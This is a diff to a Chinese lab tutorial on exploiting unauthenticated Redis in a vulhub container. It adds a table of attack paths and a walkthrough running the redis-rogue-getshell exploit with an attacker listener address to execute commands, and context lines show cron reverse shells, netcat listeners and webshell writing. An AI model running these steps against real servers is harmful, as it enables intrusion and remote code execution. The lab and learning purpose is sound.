@@ -40,7 +40,15 @@ ss -antpl
 
 ![image-20231019203714913](./imgs/image-20231019203714913.png)
 
-### 写入计划任务获取反弹shell
+
+
+| 读取数据库内容 | 读取系统文件                                                 | 执行系统命令                                                 |
+| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
+| 信息泄露<br>   | 直接写WebShell<br><br/>计划任务反弹Shell<br/><br/>SSH免密登录<br/><br/>.... | [redis-rogue-getshell](https://github.com/vulhub/redis-rogue-getshell)<br>[redis REC-EXP](https://github.com/n0b0dyCN/redis-rogue-server) |
+
+
+
+### :heart_eyes_cat:写入计划任务获取反弹shell
 
 > 由于Redis存在未授权访问漏洞，所以无需账号密码就可以在我们的Redis目录下去远程控制靶机的Redis数据库，但是我们希望不仅仅是可以操作对方的Redis数据库，想提权去控制服务器，比较容易想到的就是想办法写个反弹shell，让靶机来连接我们，如果可以成功反弹，我们就可以提权。我们想到可以让靶机设定一个定时来连接攻击机的计划任务，从而实现反弹；但是写计划任务是需要在计划任务的目录`/var/spool/cron`中去执行命令，而我们现在只能操作数据库，根本没办法去进入到服务器的计划任务目录，更别说是写计划任务。
 >
@@ -114,7 +122,7 @@ nc -lvp 6868
 
 
 
-### 利用SSH写公钥，免密登陆
+### :heart_eyes_cat:利用SSH写公钥，免密登陆
 
 > 前提条件：目标机器开启了ssh服务，且以root权限启动redis
 
@@ -149,7 +157,7 @@ save # 将数据保存在目标服务器硬盘上
 
 ![image-20231019205507935](./imgs/image-20231019205507935.png)
 
-### 利用Redis写WebShell
+### :heart_eyes_cat:利用Redis写WebShell
 
 > 前提条件：需要对方开启了web服务和知道web路径，并有读写权限。
 >
@@ -162,10 +170,67 @@ config set dbfilename shell.php
 save
 ```
 
+### :heart_eyes_cat:Redis未授权执行系统命令
+
+环境：`/vulhub/vulhub/redis/4-unacc`
+
+`docker-compose up -d`启动环境后，连接`redis`客户端
+
+无密码，直接连接成功
+
+```bash
+┌──(kali㉿kali)-[~/Vulnerability-library/vulhub/redis/4-unacc]
+└─$ redis-cli -h 127.0.0.1   
+127.0.0.1:6379> info
+# Server
+redis_version:4.0.14
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:3914f9509eb3b682
+redis_mode:standalone
+os:Linux 6.1.0-kali9-amd64 x86_64
+.......
+.......
+```
+
+![image-20230901185901167](./imgs/image-20230901185901167.png)
+
+从`github`上把[redis-rogue-getshell](https://github.com/vulhub/redis-rogue-getshell)这个项目克隆下来
+
+```
+cd redis-rogue-getshell/RedisModulesSDK/
+make
+```
+
+会生成一个`exp.so`文件，编译时会报错，不影响我们操作
+
+```
+cd ../
+python3 redis-master.py -r 127.0.0.1 -p 6379 -L 192.168.80.141 -P 8888 -f RedisModulesSDK/exp.so -c "id"
+```
+
+执行`id`命令
+
+![image-20230901192352869](./imgs/image-20230901192352869.png)
+
+执行其他命令
+
+```python
+python3 redis-master.py -r 127.0.0.1 -p 6379 -L 192.168.80.141 -P 8888 -f RedisModulesSDK/exp.so -c "whoami"
+```
+
+![image-20230901192429115](./imgs/image-20230901192429115.png)
+
+
+
+
+
+
+
 ## 3、检测未授权访问漏洞检测工具
 
 [下载地址](https://github.com/xk11z/unauthorized_com)
 
-## 参考
+## 4、参考
 
 - [面试经典 Redis未授权漏洞与组合拳](https://www.freebuf.com/vuls/349094.html)
